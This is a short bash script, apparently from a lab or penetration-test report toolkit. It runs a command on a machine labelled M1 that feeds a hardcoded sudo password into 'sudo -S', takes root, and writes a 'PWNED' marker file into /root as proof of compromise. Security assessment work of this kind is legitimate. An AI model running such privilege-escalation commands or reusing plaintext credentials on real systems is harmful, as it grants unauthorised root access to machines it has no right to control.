#!/usr/bin/env bash
# root-marker.sh — ROOT en M1 por B3 + sudo, con marcador en /root.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

./informe/tools/vm.sh m1 '
echo "Admin13.-" | sudo -S bash -c "id; hostname; echo ROOT-PWNED-M1 > /root/PWNED-M1-root.txt; cat /root/PWNED-M1-root.txt; ls -l /root/PWNED-M1-root.txt" 2>/dev/null
'
